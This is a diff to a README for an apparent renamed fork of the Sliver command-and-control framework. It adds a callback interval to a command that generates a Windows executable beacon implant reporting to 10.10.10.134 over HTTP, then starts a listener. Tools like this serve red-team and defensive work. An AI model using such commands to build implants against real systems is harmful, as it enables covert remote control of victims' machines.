@@ -22,7 +22,7 @@ Beacons are renamed to Krakens, and sliver-server/client is renamed to golder-se
 ```
 sudo ./golder-server
 
-generate kraken --http 10.10.10.134 -s /mnt/c/Payloads --arch amd64 --os windows -B -f exe
+generate kraken --http 10.10.10.134 -s /mnt/c/Payloads --arch amd64 --os windows -B -f exe --seconds 5
 
 http
 ```
